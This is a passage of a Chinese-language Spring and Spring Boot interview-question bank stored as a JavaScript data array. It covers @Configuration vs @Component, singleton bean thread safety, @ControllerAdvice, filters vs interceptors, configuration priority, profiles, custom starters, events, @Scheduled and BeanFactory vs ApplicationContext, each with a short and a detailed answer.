  {c:"Spring",d:"★★",q:"@Configuration 和 @Component 有什么区别？",
   a:`<p>两者都能让类被 Spring 扫描成 Bean，但<strong>@Configuration 是 Full 模式，@Component 是 Lite 模式</strong>，关键区别在 @Bean 方法的处理：</p>
      <ul>
        <li><strong>@Configuration</strong>：Spring 会用 CGLIB 给这个类生成代理，类里 @Bean 方法<strong>调用另一个 @Bean 方法时，返回的是容器里的单例</strong>（不会真的 new 两次）。</li>
        <li><strong>@Component</strong>：不生成代理，@Bean 方法之间调用就是<strong>普通方法调用</strong>，每次都 new 新对象（不是单例）。</li>
      </ul>
      <blockquote>所以配置类（里面定义各种 @Bean）一定要用 @Configuration，保证 Bean 是单例的。这也是 spring.factories 里配置类都是 @Configuration 的原因。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. Full 模式 vs Lite 模式</strong></p>
      <ul>
        <li><strong>@Configuration（Full）</strong>：Spring 用 CGLIB 给配置类生成代理子类。类内 @Bean 方法调用另一个 @Bean 方法时，代理会拦截，<strong>返回容器里已存在的单例</strong>（不会重复 new）。保证 Bean 单例。</li>
        <li><strong>@Component（Lite）</strong>：不生成代理。@Bean 方法间调用就是<strong>普通 Java 方法调用</strong>，每次调用都执行方法体，可能 new 多个对象（非单例）。不会被 Spring 拦截。</li>
      </ul>
      <p><strong>2. 例子说明区别</strong></p>
      <pre><code>@Configuration
class Config {
    @Bean A a() { return new A(b()); }   // b() 被代理拦截，返回容器的单例 B
    @Bean B b() { return new B(); }
}
// 调 a() 时，内部 b() 返回的是容器里的单例 B（只 new 一次）</code></pre>
      <pre><code>@Component  // Lite 模式
class Config {
    @Bean A a() { return new A(b()); }   // b() 是普通调用，每次 new B
    @Bean B b() { return new B(); }
}
// a() 里 b() 会真的 new 一个新 B（和容器的 B 不是同一个）</code></pre>
      <p><strong>3. 为什么 @Configuration 要用代理</strong></p>
      <p>为了保证 @Bean 方法的语义——每个 @Bean 方法对应的 Bean 在容器里是<strong>单例</strong>的。如果方法间直接调用会重复创建，破坏单例。代理拦截后从容器获取，保证唯一。</p>
      <p><strong>4. proxyBeanMethods 配置</strong></p>
      <p>@Configuration(proxyBeanMethods = false)：关闭代理（变 Lite 行为）。Spring Boot 的自动配置类常用这个（提升启动速度，因为不需要 CGLIB 代理），前提是配置类内部不互相调用 @Bean 方法。</p>
      <p><strong>5. 面试标准答法</strong></p>
      <p>@Configuration 是 Full 模式（CGLIB 代理，@Bean 间调用返回容器单例）；@Component 是 Lite 模式（无代理，@Bean 间调用是普通调用每次 new）。配置类用 @Configuration 保证单例。proxyBeanMethods=false 关代理提速。</p>`},
  {c:"Spring",d:"★",q:"@Component、@Service、@Repository、@Controller 有什么区别？",
   a:`<p>本质上<strong>没有功能区别</strong>，都是 @Component 的衍生注解，作用都是把类注册成 Bean。</p>
      <p>区别只是<strong>语义</strong>不同，表示这个类属于哪一层：</p>
      <ul>
        <li><strong>@Controller</strong>：表现层（Web 接口）。</li>
        <li><strong>@Service</strong>：业务层。</li>
        <li><strong>@Repository</strong>：持久层（DAO），额外会把数据库异常转成统一的 DataAccessException。</li>
        <li><strong>@Component</strong>：通用组件，不属于上面三层的。</li>
      </ul>
      <blockquote>为了代码可读性和分层清晰，按层用对应的注解。功能上它们等价。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 本质：都是 @Component</strong></p>
      <p>@Controller、@Service、@Repository 都标注了 @Component 元注解，功能完全相同——都是让 Spring 扫描并注册为 Bean。区别只是<strong>语义</strong>（分层标记）。</p>
      <p><strong>2. 各注解的语义和小差异</strong></p>
      <ul>
        <li><strong>@Controller</strong>：MVC 的表现层控制器，处理 HTTP 请求。配合 @RequestMapping/@GetMapping。能返回视图或 JSON（@RestController = @Controller + @ResponseBody）。</li>
        <li><strong>@Service</strong>：业务逻辑层。纯语义标记，无额外功能。</li>
        <li><strong>@Repository</strong>：持久层/DAO。<strong>额外功能</strong>：配合 PersistenceExceptionTranslationPostProcessor，把原生 JDBC/JPA 异常（如 SQLException）转成 Spring 统一的 DataAccessException 体系。</li>
        <li><strong>@Component</strong>：通用组件，不属于上述三层的（如工具类、自定义组件）。</li>
      </ul>
      <p><strong>3. 为什么分这么多注解</strong></p>
      <ul>
        <li><strong>分层清晰</strong>：一眼看出类的职责（Controller/Service/DAO）。</li>
        <li><strong>切面过滤</strong>：AOP 可以按注解类型筛选（如只对 Service 层加日志）。</li>
        <li><strong>@Repository 的异常转换</strong>：统一异常处理。</li>
      </ul>
      <p><strong>4. 面试标准答法</strong></p>
      <p>本质都是 @Component，功能相同。区别是语义：@Controller 表现层（处理HTTP）、@Service 业务层、@Repository DAO层（额外转异常为DataAccessException）、@Component 通用。分层清晰、利于切面过滤。</p>`},
  {c:"Spring",d:"★★",q:"Spring 的单例 Bean 有线程安全问题吗？怎么处理？",
   a:`<p><strong>有潜在线程安全问题</strong>。Spring 的 Bean 默认是单例的，所有线程共享一个实例。如果 Bean 里有<strong>可变的成员变量</strong>（有状态的），多线程并发修改就会出问题。</p>
      <p>解决方案：</p>
      <ul>
        <li><strong>最推荐</strong>：把 Bean 设计成<strong>无状态</strong>的（只有方法，没有可变成员变量），这是最简单的做法。Spring 的 Service 一般都是无状态的。</li>
        <li>用 ThreadLocal 让每个线程有自己的副本。</li>
        <li>改作用域为 prototype（每次新建，但性能差）。</li>
        <li>成员变量加锁（降低并发）。</li>
      </ul>
      <blockquote>实际开发中，Service/DAO 这种 Bean 都是无状态的（方法里用局部变量），天然线程安全。Controller 也是。注意别在单例 Bean 里放共享的可变成员变量。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 是否线程安全取决于有没有状态</strong></p>
      <p>Spring 单例 Bean 是所有线程共享一个实例。<strong>关键看 Bean 是否有"可变的成员变量"（状态）</strong>：</p>
      <ul>
        <li><strong>无状态 Bean</strong>（只有方法、无可变成员变量）：天然线程安全。Service/DAO/Controller 一般都是。</li>
        <li><strong>有状态 Bean</strong>（有可变成员变量，如 List、Map、计数器）：多线程并发访问会出问题（数据竞争、不一致）。</li>
      </ul>
      <p><strong>2. 无状态为什么安全</strong></p>
      <p>方法内用局部变量，每个线程有自己的栈帧，局部变量是线程私有的，互不影响。所以无状态 Bean 即使单例共享，也是线程安全的。</p>
      <p><strong>3. 有状态的常见错误</strong></p>
      <ul>
        <li>在 Service 里定义成员变量（如 private List&lt;User&gt; cache）做缓存，多线程并发修改。</li>
        <li>定义 SimpleDateFormat 成员变量（它非线程安全）。</li>
        <li>定义可变计数器。</li>
      </ul>
      <p><strong>4. 解决方案</strong></p>
      <ul>
        <li><strong>设计成无状态（最佳）</strong>：把状态移到方法局部变量，或用方法参数传递。Service/Controller 都应无状态。</li>
        <li><strong>ThreadLocal</strong>：每个线程一份副本。注意用完 remove，防内存泄漏。</li>
        <li><strong>改为 prototype</strong>：每次新建，但违背单例复用，性能差。</li>
        <li><strong>用并发安全的数据结构</strong>：ConcurrentHashMap、AtomicInteger 等。</li>
        <li><strong>加锁</strong>：synchronized/Lock，降低并发，慎用。</li>
      </ul>
      <p><strong>5. 最佳实践</strong></p>
      <p>Spring 的设计哲学就是<strong>Bean 无状态化</strong>，状态交给外部（数据库、缓存、ThreadLocal）。这样单例 Bean 既高效又安全。</p>
      <p><strong>6. 面试标准答法</strong></p>
      <p>单例 Bean 线程安全取决于有无状态。无状态（无成员变量）天然安全（局部变量线程私有）。有状态（成员变量）有并发问题。解决：设计成无状态（最佳）、ThreadLocal、并发集合、加锁、prototype。Spring 推荐无状态化。</p>`},
  {c:"Spring",d:"★★",q:"全局异常处理（@ControllerAdvice）怎么用？",
   a:`<p>用 <strong>@ControllerAdvice + @ExceptionHandler</strong> 实现全局异常处理，避免每个 Controller 里都写 try-catch。</p>
      <p>示例：</p>
      <pre><code>@RestControllerAdvice
public class GlobalExceptionHandler {
    @ExceptionHandler(BizException.class)
    public Result handleBiz(BizException e) {
        return Result.fail(e.getMessage());
    }
    @ExceptionHandler(Exception.class)
    public Result handleAll(Exception e) {
        log.error("系统异常", e);
        return Result.fail("系统繁忙");
    }
}</code></pre>
      <p>原理：Spring MVC 的 DispatcherServlet 在执行 Controller 出异常时，会交给 HandlerExceptionResolver，@ExceptionHandler 就是其中一种实现，按异常类型匹配对应方法。</p>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 用法</strong></p>
      <ul>
        <li><strong>@ControllerAdvice</strong>（或 @RestControllerAdvice，返回值当 JSON）：标注一个全局组件类。</li>
        <li><strong>@ExceptionHandler(异常类)</strong>：标注方法，处理指定类型的异常，返回统一结果。</li>
        <li>可配合 @ResponseBody/@RestControllerAdvice 返回 JSON。</li>
      </ul>
      <p><strong>2. 匹配规则</strong></p>
      <ul>
        <li>按异常类型<strong>就近匹配</strong>（子类优先于父类）。如 BizException 匹配 @ExceptionHandler(BizException)，不匹配 Exception 的。</li>
        <li>多个 @ControllerAdvice 可用 @Order 排序。</li>
        <li>局部 @ExceptionHandler（Controller 内）优先于全局 @ControllerAdvice。</li>
      </ul>
      <p><strong>3. 原理</strong></p>
      <p>Spring MVC 的 DispatcherServlet 在 doDispatch 执行 Handler 出异常时，交给 HandlerExceptionResolver 处理。ExceptionHandlerExceptionResolver 负责解析 @ExceptionHandler：在 ControllerLocal（本类的）和 @ControllerAdvice 全局查找匹配的 @ExceptionHandler 方法，反射调用。</p>
      <p><strong>4. 实际用法</strong></p>
      <ul>
        <li>自定义业务异常（BizException）+ 全局处理返回业务码。</li>
        <li>兜底处理 Exception（记录日志、返回友好提示）。</li>
        <li>处理参数校验异常（MethodArgumentNotValidException，@Valid 校验失败）。</li>
        <li>统一返回格式（Result 对象）。</li>
      </ul>
      <p><strong>5. 面试标准答法</strong></p>
      <p>@ControllerAdvice + @ExceptionHandler 全局处理异常，按异常类型就近匹配。原理：DispatcherServlet 出异常时由 HandlerExceptionResolver（ExceptionHandlerExceptionResolver 解析@ExceptionHandler）处理。用于业务异常、参数校验异常、兜底系统异常，统一返回格式。</p>`},
  {c:"Spring",d:"★★",q:"拦截器（Interceptor）和过滤器（Filter）有什么区别？",
   a:`<table><tr><th></th><th>Filter（过滤器）</th><th>Interceptor（拦截器）</th></tr>
      <tr><td>来源</td><td>Servlet 规范</td><td>Spring MVC</td></tr>
      <tr><td>依赖</td><td>不依赖 Spring</td><td>是 Spring 的组件</td></tr>
      <tr><td>执行时机</td><td>请求进 Servlet 前后</td><td>请求进 Controller 前后</td></tr>
      <tr><td>能获取的上下文</td><td>较少</td><td>能拿到 Controller 的 Handler 信息</td></tr></table>
      <p><strong>执行顺序</strong>：Filter 前 → Interceptor preHandle → Controller → Interceptor postHandle → Interceptor afterCompletion → Filter 后。</p>
      <blockquote>Filter 更底层（在 Tomcat 层），Interceptor 更靠业务。一般通用过滤（编码、CORS、日志）用 Filter，业务相关（登录校验、权限）用 Interceptor。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 来源和规范</strong></p>
      <ul>
        <li><strong>Filter</strong>：Servlet 规范（javax.servlet.Filter），由 Servlet 容器（Tomcat）管理，和 Spring 无关。所有 Web 应用都能用。</li>
        <li><strong>Interceptor</strong>：Spring MVC（HandlerInterceptor），是 Spring 组件，只能 Spring MVC 用。</li>
      </ul>
      <p><strong>2. 执行时机和范围</strong></p>
      <ul>
        <li><strong>Filter</strong>：在请求<strong>进入 Servlet（DispatcherServlet）之前</strong>和响应离开 Servlet 之后执行。能拦截所有请求（包括静态资源）。<code>doFilter</code> 内部 chain.doFilter 转发。</li>
        <li><strong>Interceptor</strong>：在请求<strong>进入 Controller（Handler）之前/之后</strong>执行。preHandle（Controller 前）、postHandle（Controller 后、渲染前）、afterCompletion（渲染后）。只拦截到 Controller 的请求。</li>
      </ul>
      <p><strong>3. 能获取的上下文</strong></p>
      <ul>
        <li>Filter：只有 ServletRequest/ServletResponse，不知道要执行哪个 Controller 方法。</li>
        <li>Interceptor：能拿到 <strong>HandlerExecutionChain</strong>（要执行的 Controller 方法、拦截器链），可做权限判断（知道访问哪个接口）。</li>
      </ul>
      <p><strong>4. 执行顺序</strong></p>
      <p>Filter chain 前 → Interceptor.preHandle → Controller → Interceptor.postHandle → View 渲染 → Interceptor.afterCompletion → Filter chain 后。多个 Filter 按声明顺序（或 @Order），Interceptor 按 @Order 或注册顺序。</p>
      <p><strong>5. 使用场景</strong></p>
      <ul>
        <li><strong>Filter</strong>：通用底层处理——字符编码、CORS 跨域、日志、请求包装（如 XSS 过滤）、压缩。不依赖 Spring。</li>
        <li><strong>Interceptor</strong>：业务相关——登录状态校验、权限校验、接口耗时统计、参数预处理。需要 Spring 的 Bean 注入。</li>
      </ul>
      <p><strong>6. 能否注入 Spring Bean</strong></p>
      <p>Filter 注册成 Spring Bean（FilterRegistrationBean）也能注入 Bean，但它是 Servlet 规范组件，生命周期和 Spring 不完全同步。Interceptor 是 Spring 组件，天然能注入 Bean。</p>
      <p><strong>7. 面试标准答法</strong></p>
      <p>Filter 是 Servlet 规范（容器管理，请求进 Servlet 前后执行，能拦静态资源，通用处理如编码/CORS）；Interceptor 是 Spring MVC（请求进 Controller 前后，能拿 Handler 信息，业务如登录/权限）。执行顺序：Filter前→Interceptor preHandle→Controller→postHandle→afterCompletion→Filter后。</p>`},
  {c:"Spring",d:"★★",q:"Spring Boot 的配置文件优先级是怎样的？",
   a:`<p>从高到低（高优先级覆盖低优先级）：</p>
      <ol>
        <li>命令行参数（<code>--server.port=9090</code>）。</li>
        <li>系统环境变量。</li>
        <li>jar 包<strong>外部</strong>的 application.yml/properties（config 目录下的优先）。</li>
        <li>jar 包<strong>内部</strong>的 application.yml/properties。</li>
        <li>@PropertySource 注解指定的。</li>
        <li>默认属性（SpringApplication.setDefaultProperties）。</li>
      </ol>
      <p><strong>yml vs properties</strong>：两者等价，yml 层次清晰、支持配置覆盖（多环境），properties 简单直观。同一个项目里两者都有时，properties 优先级更高。</p>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 完整优先级（从高到低）</strong></p>
      <ol>
        <li><strong>命令行参数</strong>（--name=value，通过 args 传入）。</li>
        <li>SPRING_APPLICATION_JSON 中的属性（环境变量形式的 JSON）。</li>
        <li><strong>ServletConfig / ServletContext</strong> 初始化参数。</li>
        <li><strong>JNDI</strong>（java:comp/env）。</li>
        <li><strong>Java 系统属性</strong>（System.getProperty，-Dname=value）。</li>
        <li><strong>操作系统环境变量</strong>。</li>
        <li><strong>RandomValuePropertySource</strong>（random.* 随机值）。</li>
        <li><strong>jar 包外部的 application-{profile}.yml/properties</strong>（带 profile 的）。</li>
        <li><strong>jar 包内部的 application-{profile}.yml/properties</strong>。</li>
        <li><strong>jar 包外部的 application.yml/properties</strong>。</li>
        <li><strong>jar 包内部的 application.yml/properties</strong>。</li>
        <li>@PropertySource 指定的（在 @Configuration 类上）。</li>
        <li>SpringApplication.setDefaultProperties 设置的默认。</li>
      </ol>
      <p><strong>2. 简化记忆</strong></p>
      <p>命令行 &gt; 系统属性/环境变量 &gt; 外部配置文件 &gt; 内部配置文件 &gt; @PropertySource &gt; 默认。外部的覆盖内部的，带 profile 的覆盖不带的。</p>
      <p><strong>3. 外部配置文件位置（从高到低）</strong></p>
      <ol>
        <li>当前目录的 /config 子目录。</li>
        <li>当前目录。</li>
        <li>classpath 的 /config 包。</li>
        <li>classpath 根目录。</li>
      </ol>
      <p><strong>4. yml vs properties</strong></p>
      <ul>
        <li>等价，都能用。同项目同 profile 下两者都有，<strong>properties 优先级高于 yml</strong>。</li>
        <li>yml：层次清晰、支持多文档（--- 分隔）、多环境；但对缩进敏感、有重复 key 问题。</li>
        <li>properties：简单直观、无格式要求；但冗长。</li>
      </ul>
      <p><strong>5. 实际应用</strong></p>
      <ul>
        <li>开发用 yml（清晰）。</li>
        <li>生产环境敏感配置用环境变量或命令行（不打进 jar）。</li>
        <li>外部配置文件放 jar 同目录（部署后改配置不用重新打包）。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>命令行&gt;系统属性/环境变量&gt;外部配置文件（config目录&gt;同级）&gt;内部配置文件&gt;@PropertySource&gt;默认。带profile覆盖不带的。properties优先于yml。生产用环境变量/外部配置，不打进jar。</p>`},
  {c:"Spring",d:"★",q:"Spring Boot 多环境配置（Profiles）怎么用？",
   a:`<p>用 <strong>@Profile</strong> 或 application-{env}.yml 实现多环境：</p>
      <ul>
        <li>建多个配置文件：application-dev.yml、application-prod.yml、application-test.yml。</li>
        <li>在 application.yml 里用 <code>spring.profiles.active=dev</code> 激活。</li>
        <li>也可以用命令行 <code>--spring.profiles.active=prod</code> 或环境变量激活。</li>
      </ul>
      <p>Bean 也能加 <code>@Profile("dev")</code>，表示只在 dev 环境生效。</p>
      <blockquote>实际项目：开发用 dev，测试用 test，生产用 prod。打包后用命令行参数指定环境，不改代码。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 多环境配置的需求</strong></p>
      <p>不同环境（开发/测试/生产）配置不同（数据库地址、日志级别、第三方密钥）。不能改代码重新打包，要能切换配置。</p>
      <p><strong>2. 方式一：application-{profile}.yml（最常用）</strong></p>
      <ul>
        <li>建多个配置文件：application-dev.yml（开发）、application-test.yml（测试）、application-prod.yml（生产）。</li>
        <li>在 application.yml 里激活：<code>spring.profiles.active: dev</code>。</li>
        <li>激活后，对应 profile 文件的配置<strong>覆盖</strong> application.yml 的同名项。</li>
        <li>灵活激活方式：命令行 <code>--spring.profiles.active=prod</code>、环境变量 SPRING_PROFILES_ACTIVE、JVM 参数 -Dspring.profiles.active=prod。</li>
      </ul>
      <p><strong>3. 方式二：@Profile 注解</strong></p>
      <p>Bean 或 @Configuration 标 @Profile("dev")，只在指定 profile 激活时才注册。</p>
      <pre><code>@Configuration
@Profile("dev")
public class DevConfig {
    @Bean DataSource devDataSource() { ... }
}</code></pre>
      <p><strong>4. spring.profiles.group（分组）</strong></p>
      <p>Spring Boot 2.4+ 支持组合多个 profile。</p>
      <p><strong>5. spring.profiles.include（引入）</strong></p>
      <p>在一个 profile 里包含另一个。</p>
      <p><strong>6. 实际用法</strong></p>
      <ul>
        <li>开发：本地 dev。</li>
        <li>测试/预发：test/staging。</li>
        <li>生产：prod（敏感配置用环境变量，不打进 jar）。</li>
        <li>打包后用 java -jar app.jar --spring.profiles.active=prod 启动。</li>
      </ul>
      <p><strong>7. 面试标准答法</strong></p>
      <p>用 application-{profile}.yml 分环境配置，spring.profiles.active 激活（命令行/环境变量/yml）。@Profile 注解控制 Bean 按环境注册。生产用环境变量激活、敏感配置用环境变量不打进 jar。</p>`},
  {c:"Spring",d:"★★",q:"怎么自定义一个 Spring Boot Starter？",
   a:`<p>开发 Starter 的步骤：</p>
      <ol>
        <li>新建一个 maven 模块（命名建议 xxx-spring-boot-starter）。</li>
        <li>写自动配置类：用 <code>@Configuration + @ConditionalOnXxx + @Bean</code>，定义要自动注册的 Bean。</li>
        <li>写配置属性类：用 <code>@ConfigurationProperties(prefix="xxx")</code> 绑定 yml 配置。</li>
        <li>在 <code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code> 文件里写上自动配置类的全限定名（3.0 写法，2.7 前用 spring.factories）。</li>
        <li>打包发布，别人引入依赖就能用。</li>
      </ol>
      <blockquote>核心就是"约定大于配置"：用户引入 starter，框架根据 @Conditional 自动配置默认 Bean，用户想改就在 yml 里改配置项覆盖。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 命名规范</strong></p>
      <ul>
        <li>第三方 Starter：xxx-spring-boot-starter（如 mybatis-spring-boot-starter）。</li>
        <li>官方 Starter：spring-boot-starter-xxx（如 spring-boot-starter-web）。</li>
      </ul>
      <p><strong>2. 开发步骤详解</strong></p>
      <ol>
        <li><strong>建模块</strong>：Maven 模块，依赖 spring-boot-autoconfigure。</li>
        <li><strong>配置属性类</strong>：
          <pre><code>@ConfigurationProperties(prefix = "xxx")
public class XxxProperties {
    private boolean enabled = true;
    private String name;
    // getter/setter
}</code></pre>
        </li>
        <li><strong>自动配置类</strong>：
          <pre><code>@AutoConfiguration
@ConditionalOnClass(XxxService.class)
@EnableConfigurationProperties(XxxProperties.class)
public class XxxAutoConfiguration {
    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnProperty(prefix = "xxx", name = "enabled", havingValue = "true")
    public XxxService xxxService(XxxProperties props) {
        return new XxxService(props);
    }
}</code></pre>
        </li>
        <li><strong>注册自动配置类</strong>：
          <ul>
            <li>3.0 / 2.7+：META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports 文件，每行一个自动配置类全限定名。</li>
            <li>2.6-：META-INF/spring.factories 文件，键 org.springframework.boot.autoconfigure.EnableAutoConfiguration=类名。</li>
          </ul>
        </li>
        <li><strong>打包发布</strong>，别人 pom 引入即可。</li>
      </ol>
      <p><strong>3. 关键设计原则</strong></p>
      <ul>
        <li><strong>@ConditionalOnMissingBean</strong>：用户自定义 Bean 时，默认配置不生效（让用户能覆盖）。</li>
        <li><strong>@ConditionalOnProperty</strong>：用配置开关控制是否启用。</li>
        <li><strong>失败友好</strong>：用户没引入依赖时 @ConditionalOnClass 不生效，不报错。</li>
        <li><strong>命名清晰</strong>：配置前缀统一。</li>
      </ul>
      <p><strong>4. 面试标准答法</strong></p>
      <p>建模块→配置属性类(@ConfigurationProperties)→自动配置类(@Configuration+@ConditionalOnXxx+@Bean)→注册文件(3.0用AutoConfiguration.imports/2.6-用spring.factories)→打包。核心@ConditionalOnMissingBean让用户覆盖，@ConditionalOnProperty开关控制。</p>`},
  {c:"Spring",d:"★★",q:"Spring 的事件机制（ApplicationEvent）怎么用？",
   a:`<p>Spring 事件机制用于<strong>解耦</strong>，典型场景：注册成功后发短信、发邮件，不用在主流程里写死。</p>
      <p>三个角色：</p>
      <ul>
        <li><strong>事件</strong>：继承 ApplicationEvent 或直接是个普通类（泛型版）。</li>
        <li><strong>发布者</strong>：注入 ApplicationEventPublisher，调 publishEvent(事件)。</li>
        <li><strong>监听者</strong>：实现 ApplicationListener，或用 <code>@EventListener</code> 注解方法。</li>
      </ul>
      <p>默认是<strong>同步</strong>的（在发布者线程里执行），加 <code>@Async</code> 可以异步。</p>
      <blockquote>好处：业务和通知解耦，新增通知类型不用改主流程代码。Spring 内部也大量用事件（如 ContextRefreshedEvent）。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 三个角色</strong></p>
      <ul>
        <li><strong>事件 ApplicationEvent</strong>：继承它（4.2 前必须，之后可以是任意 POJO）。</li>
        <li><strong>发布者</strong>：ApplicationEventPublisher（ApplicationContext 实现它），调 publishEvent(event)。</li>
        <li><strong>监听者</strong>：实现 ApplicationListener&lt;E&gt;，或用 @EventListener 注解方法（推荐）。</li>
      </ul>
      <p><strong>2. 用法示例</strong></p>
      <pre><code>// 事件
public class UserRegisteredEvent {
    private Long userId;
    // 构造、getter
}
// 发布
@Autowired ApplicationEventPublisher publisher;
publisher.publishEvent(new UserRegisteredEvent(1L));
// 监听（注解版，推荐）
@EventListener
public void onRegistered(UserRegisteredEvent event) {
    sendSms(event.getUserId());
}</code></pre>
      <p><strong>3. 同步 vs 异步</strong></p>
      <ul>
        <li><strong>默认同步</strong>：监听器在发布者线程内同步执行（publishEvent 阻塞直到监听器执行完）。</li>
        <li><strong>异步</strong>：监听方法加 @Async（需 @EnableAsync），在线程池异步执行，不阻塞发布者。</li>
      </ul>
      <p><strong>4. @TransactionalEventListener（事务事件）</strong></p>
      <p>配合事务：事件在事务的特定阶段触发（AFTER_COMMIT 事务提交后、BEFORE_COMMIT 等）。常用于"事务提交后才发通知"。</p>
      <p><strong>5. Spring 内置事件</strong></p>
      <ul>
        <li>ContextRefreshedEvent：ApplicationContext 刷新完成（启动）。</li>
        <li>ContextStartedEvent/ContextStoppedEvent/ContextClosedEvent。</li>
        <li>ApplicationReadyEvent：Spring Boot 启动完成。</li>
      </ul>
      <p><strong>6. 应用场景</strong></p>
      <ul>
        <li>业务解耦：注册后发通知、下单后扣库存（但跨服务一般用 MQ）。</li>
        <li>框架扩展：监听启动事件做初始化。</li>
      </ul>
      <p><strong>7. 面试标准答法</strong></p>
      <p>事件(ApplicationEvent/POJO)、发布(ApplicationEventPublisher.publishEvent)、监听(@EventListener注解或ApplicationListener)。默认同步，@Async异步。@TransactionalEventListener配合事务阶段。解耦业务（注册后通知）。</p>`},
  {c:"Spring",d:"★",q:"Spring 定时任务（@Scheduled）怎么用？",
   a:`<p>用法：</p>
      <ol>
        <li>启动类加 <code>@EnableScheduling</code> 开启定时任务支持。</li>
        <li>方法上加 <code>@Scheduled</code>，指定执行规则：
          <ul>
            <li><code>@Scheduled(fixedRate = 5000)</code>：固定频率（每5秒，不管上次执行完没完）。</li>
            <li><code>@Scheduled(fixedDelay = 5000)</code>：固定延迟（上次执行完后再等5秒）。</li>
            <li><code>@Scheduled(cron = "0 0 2 * * ?")</code>：cron 表达式（每天凌晨2点）。</li>
          </ul>
        </li>
      </ol>
      <blockquote>注意：默认是单线程执行定时任务，一个卡住会影响其他。建议配置线程池（实现 SchedulingConfigurer），或者用 Quartz 做分布式定时任务。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 用法</strong></p>
      <ul>
        <li>启动类或配置类加 @EnableScheduling 开启支持。</li>
        <li>@Component 类的 public 无参/返回 void 方法加 @Scheduled。</li>
      </ul>
      <p><strong>2. @Scheduled 的三种触发方式</strong></p>
      <ul>
        <li><strong>fixedRate</strong>：固定频率。两次任务<strong>开始</strong>的间隔（不论上次是否完成）。如 fixedRate=5000，每 5 秒启动一次（不管上次跑多久）。若上次未完，会等它完或并发（取决于配置）。</li>
        <li><strong>fixedDelay</strong>：固定延迟。上次任务<strong>结束</strong>到下次任务<strong>开始</strong>的间隔。如 fixedDelay=5000，上次跑完等 5 秒再跑。</li>
        <li><strong>cron</strong>：cron 表达式，灵活定时。格式 "秒 分 时 日 月 周"。如 "0 0 2 * * ?" 每天凌晨 2 点。</li>
      </ul>
      <p>fixedRate/fixedDelay 可配 initialDelay（首次延迟）。</p>
      <p><strong>3. 单线程问题（默认）</strong></p>
      <p>默认所有 @Scheduled 方法在一个线程串行执行。一个任务卡住，其他任务等不到执行。</p>
      <p><strong>4. 配置多线程</strong></p>
      <ul>
        <li>实现 SchedulingConfigurer，配置 TaskScheduler 的线程池。</li>
        <li>或配置 spring.task.scheduling.pool.size（Spring Boot）。</li>
        <li>方法上加 @Async（配合 @EnableAsync）异步执行。</li>
      </ul>
      <p><strong>5. 分布式定时任务</strong></p>
      <p>@Scheduled 是单机的，多实例部署会重复执行。分布式方案：</p>
      <ul>
        <li><strong>Quartz</strong>：集群定时任务（基于数据库锁）。</li>
        <li><strong>XXL-Job/PowerJob</strong>：分布式调度中心。</li>
        <li><strong>分布式锁</strong>：@Scheduled + Redis 分布式锁（只让一个实例执行）。</li>
        <li>Elastic-Job。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>@EnableScheduling + @Scheduled。三种触发：fixedRate（开始间隔）、fixedDelay（结束到开始间隔）、cron。默认单线程要配线程池或@Async。多实例用 Quartz/XXL-Job/分布式锁防重复执行。</p>`},
  {c:"Spring",d:"★",q:"BeanFactory 和 ApplicationContext 有什么区别？",
   a:`<p><strong>BeanFactory</strong> 是 Spring IOC 容器的<strong>顶层接口</strong>，提供最基础的 Bean 管理能力（getBean 等）。</p>
      <p><strong>ApplicationContext</strong> 继承 BeanFactory，在它的基础上扩展了很多功能：</p>
      <ul>
        <li><strong>事件发布</strong>（ApplicationEventPublisher）。</li>
        <li><strong>国际化</strong>（MessageSource）。</li>
        <li><strong>资源加载</strong>（ResourceLoader）。</li>
        <li><strong>自动注册 BeanPostProcessor</strong>。</li>
        <li><strong>初始化时机不同</strong>：BeanFactory 是懒加载（用到才创建），ApplicationContext 是预实例化（启动时全创建）。</li>
      </ul>
      <blockquote>日常开发用的都是 ApplicationContext（Spring Boot 自动用它），BeanFactory 一般只在资源极端受限的场景用。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 继承关系</strong></p>
      <p>ApplicationContext <strong>继承</strong> BeanFactory（是其子接口）。所以 ApplicationContext 拥有 BeanFactory 的所有能力，并扩展。</p>
      <p><strong>2. BeanFactory 的定位</strong></p>
      <p>IOC 容器的<strong>最顶层接口</strong>，提供最基础的 Bean 管理：getBean、containsBean、isSingleton 等。是 Spring 的核心，所有容器都实现它。</p>
      <p><strong>3. ApplicationContext 的扩展</strong></p>
      <p>ApplicationContext 还继承了多个接口：</p>
      <ul>
        <li><strong>ListableBeanFactory</strong>：批量获取 Bean（getBeansOfType、getBeanDefinitionNames）。</li>
        <li><strong>HierarchicalBeanFactory</strong>：父子容器。</li>
        <li><strong>MessageSource</strong>：国际化（i18n）。</li>
        <li><strong>ResourcePatternResolver / ResourceLoader</strong>：资源加载（classpath、文件、URL）。</li>
        <li><strong>ApplicationEventPublisher</strong>：事件发布。</li>
        <li><strong>EnvironmentCapable</strong>：环境（profile、properties）。</li>
      </ul>
      <p><strong>4. 关键区别：初始化时机</strong></p>
      <ul>
        <li><strong>BeanFactory：懒加载</strong>。getBean 时才创建 Bean（延迟）。</li>
        <li><strong>ApplicationContext：预实例化</strong>。refresh 时创建所有非 lazy 的 singleton Bean（启动时）。这样能<strong>尽早发现配置错误</strong>（如依赖缺失），而不是运行时才暴露。</li>
      </ul>
      <p><strong>5. BeanPostProcessor 自动注册</strong></p>
      <p>ApplicationContext 自动检测并注册 BeanPostProcessor（如 AOP、@Autowired）。BeanFactory 需要手动 addBeanPostProcessor，否则这些功能不生效。</p>
      <p><strong>6. 实际使用</strong></p>
      <ul>
